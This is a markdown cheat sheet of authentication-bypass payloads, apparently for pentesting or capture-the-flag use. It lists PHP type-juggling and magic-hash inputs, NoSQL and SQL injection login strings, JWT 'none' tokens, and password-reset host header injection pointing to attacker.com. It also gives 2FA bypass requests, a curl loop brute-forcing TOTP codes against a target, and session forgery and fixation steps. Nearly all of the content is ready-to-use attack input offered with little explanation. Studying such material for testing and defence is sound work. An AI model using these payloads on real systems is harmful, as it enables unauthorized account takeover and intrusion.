# Authentication Bypass

## Logic Flaw / Type Confusion
### PHP Loose Comparison
```
username=admin&password[]=           # strcmp(null) → true
username[]=admin&password[]=admin    # array vs array
```
### NoSQL Injection (MongoDB)
```json
{"username": "admin", "password": {"$ne": ""}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
{"username": "admin", "$where": "1==1"}
```
### PHP Magic Hashes
```
# Any hash starting with "0e" + digits → loose == matches another "0e..." hash
# Known MD5 "0e" hashes:
240610708
QNKCDZO
byGcY
# SHA256 "0e" hashes:
0e565460748750467605759566966915667643540283469614211767705122280997172940
```
### SQL Auth Bypass Payloads
```
' OR '1'='1' --
' OR 1=1 LIMIT 1 --
admin' --
admin' AND 1=0 UNION SELECT * FROM users WHERE '1'='1
' UNION SELECT 1,'admin','hash'--   # hash = MD5(known_password)
```
### JWT None Algorithm
```
{"alg":"none","typ":"JWT"}.{"sub":"admin","role":"admin"}.
```
## Weak Password Reset
```
# Token enumeration
/reset?token=1001   /reset?token=1002   /reset?token=1003

# Host header injection
POST /reset   Host: attacker.com   → reset link sent via attacker.com

# User-controlled user param
POST /api/reset   {"email":"attacker@evil.com","user":"admin"}

# No old_password check
POST /change-password   {"new_password":"hacked123"}

# Weak token = MD5(email + timestamp) — compute yourself
```
## 2FA / MFA Bypass
```
# Body parameter injection
POST /verify-2fa   {"code":"123456","verified":true}

# Race condition — 2FA check vs session creation sent simultaneously
POST /verify-2fa   {"code":"123456"}
POST /session      # sent in parallel

# Skip to authenticated endpoint
GET /profile   Cookie: session=   # empty session

# Brute-force short TOTP (6 digits, often no rate limit)
for i in $(seq 0 999999); do curl -X POST -d "code=$(printf '%06d' $i)" http://target.com/verify-2fa; done

# OAuth social login bypass (2FA enforced on direct login, not SSO)
```
## Session Manipulation
```
# Sequential session IDs
curl -b "session=1001" /profile   → user A
curl -b "session=1000" /profile   → user B

# Base64 decode/encode
echo "eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ==" | base64 -d
# {"user":"admin","role":"admin"} → forge

# Session fixation — force known session on victim
1. Attacker gets session=known123
2. Victim clicks http://target.com/?sid=known123
3. Victim logs in → attacker's session is now authenticated
```
## References
- [PayloadsAllTheThings Auth Bypass](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass)
- [PortSwigger Authentication](https://portswigger.net/web-security/authentication)
- [PHP Magic Hashes](https://owasp.org/www-pdf-archive/PHPMagicTricks.pdf)
